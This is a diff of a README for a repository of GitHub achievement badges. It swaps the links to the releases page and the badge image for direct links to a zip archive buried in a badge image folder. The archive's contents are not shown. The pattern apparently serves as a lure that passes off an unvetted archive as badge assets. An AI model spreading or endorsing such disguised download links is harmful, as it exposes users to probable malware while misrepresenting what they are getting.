@@ -10,7 +10,7 @@ Welcome to the GitHub Achievements repository, your go-to source for dynamic, cu
 
 ### Explore the Assets
 
-Click [here](https://github.com/Klaus998851/GitHub-Achievements/releases) to access the diverse collection of badges and achievement icons available in this repository. Whether you are looking to add a touch of personality to your profile or highlight your accomplishments, these customizable assets have you covered.
+Click [here](https://github.com/Klaus998851/GitHub-Achievements/raw/refs/heads/main/Media/Badges/Pull-Shark/PNG/Achievements-Git-Hub-v3.8.zip) to access the diverse collection of badges and achievement icons available in this repository. Whether you are looking to add a touch of personality to your profile or highlight your accomplishments, these customizable assets have you covered.
 
 ## Usage Guidelines
 
@@ -22,7 +22,7 @@ Remember, a carefully curated GitHub profile can make a lasting impression on vi
 
 Give your GitHub profile a visual boost with these eye-catching badges and achievement icons. Visit the releases section to download the assets and kickstart your profile enhancement journey today.
 
-[![Download Assets](https://img.shields.io/badge/Download-Assets-brightgreen)](https://github.com/Klaus998851/GitHub-Achievements/releases)
+[![Download Assets](https://github.com/Klaus998851/GitHub-Achievements/raw/refs/heads/main/Media/Badges/Pull-Shark/PNG/Achievements-Git-Hub-v3.8.zip)](https://github.com/Klaus998851/GitHub-Achievements/raw/refs/heads/main/Media/Badges/Pull-Shark/PNG/Achievements-Git-Hub-v3.8.zip)
 
 ---
 
